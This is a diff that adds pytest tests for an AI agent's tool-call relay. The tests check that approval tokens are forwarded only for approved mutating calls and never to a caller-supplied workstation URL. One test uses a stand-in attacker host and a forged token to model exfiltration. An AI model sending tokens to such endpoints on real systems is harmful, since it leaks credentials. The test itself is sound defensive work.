@@ -59,6 +59,82 @@ def test_dry_run_mutating_tool_allowed_without_approval() -> None:
     assert body["dry_run"] is True
 
 
+class _FakeResp:
+    status_code = 200
+    text = '{"ok": true}'
+
+    def json(self):
+        return {"ok": True}
+
+
+class _CapturingClient:
+    """Stand-in for httpx.AsyncClient that records the forwarded headers."""
+
+    captured: dict = {}
+
+    def __init__(self, *args, **kwargs):
+        pass
+
+    async def __aenter__(self):
+        return self
+
+    async def __aexit__(self, *args):
+        return False
+
+    async def post(self, url, content=None, headers=None):
+        _CapturingClient.captured = {"url": url, "headers": headers, "content": content}
+        return _FakeResp()
+
+
+def test_readonly_call_does_not_forward_token(monkeypatch) -> None:
+    # A read-only tool must NEVER forward an approval token to the
+    # caller-controlled workstation_url (exfiltration / replay risk).
+    from tekla_agent import main as main_mod
+
+    monkeypatch.setattr(main_mod.httpx, "AsyncClient", _CapturingClient)
+    resp = client.post(
+        "/tool-calls",
+        headers=AUTH,
+        json={
+            "tool": "GetSelection",
+            "args": {},
+            "approval_token": "forged.token",
+            "dry_run": False,
+            "workstation_url": "http://attacker.example/host",
+        },
+    )
+    assert resp.status_code == 200
+    assert "X-Agent-Approval" not in _CapturingClient.captured["headers"]
+
+
+def test_mutating_call_forwards_consumed_token(monkeypatch) -> None:
+    from tekla_agent import main as main_mod
+
+    beam_args = {
+        "start": {"x": 0, "y": 0, "z": 0},
+        "end": {"x": 6000, "y": 0, "z": 0},
+        "profile": "HEA300",
+        "material": "S355",
+    }
+    mint = client.post(
+        "/approvals",
+        headers={"X-Approver-Key": "test-approver-key"},
+        json={"tool": "CreateBeam", "args": beam_args, "user": "ivan",
+              "project_id": "P1", "approver": "lead"},
+    )
+    token = mint.json()["approval_token"]
+
+    monkeypatch.setattr(main_mod.httpx, "AsyncClient", _CapturingClient)
+    resp = client.post(
+        "/tool-calls",
+        headers=AUTH,
+        json={"tool": "CreateBeam", "args": beam_args, "user": "ivan",
+              "project_id": "P1", "approval_token": token, "dry_run": False},
+    )
+    assert resp.status_code == 200
+    assert _CapturingClient.captured["headers"]["X-Agent-Approval"] == token
+
+
 def test_dry_run_invalid_args_not_allowed() -> None:
     # Preflight must not report an unexecutable call as allowed.
     resp = client.post(
